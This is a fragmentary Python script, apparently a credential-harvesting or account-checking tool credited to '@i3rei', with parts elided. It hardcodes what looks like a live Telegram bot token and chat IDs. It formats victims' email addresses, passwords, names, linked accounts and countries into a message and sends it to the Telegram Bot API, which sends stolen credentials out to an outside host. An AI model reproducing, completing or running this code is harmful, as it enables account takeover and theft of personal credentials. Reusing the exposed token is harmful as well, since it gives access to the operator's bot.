...
bi = '7890893967:AAF2lFnFKeNUTUldQp_frlNRuY_WU3Q4p8Y' #tokin
id = '7724882933', '7782680242', '5895145023' #id
...
def get_infoo(Email, Password, token, CID) -> str:
    ...
    result_line = f"Email: {Email} | Pass: {Password} | Name: {name} | Linked Accounts: {zm} | Country: {cccc} | By @i3rei\n"
...
━━━━━━━━━━━━━━━━━━━━
"""
    requests.get(f'https://api.telegram.org/bot{bi}/sendPhoto?chat_id={id}&photo=https://t.me/x0dayl/3&caption={message}&parse_mode=Markdown&reply_markup={{"inline_keyboard":[[{{"text":"Devloper","url":"http://t.me/i3rei"}}]]}}')	
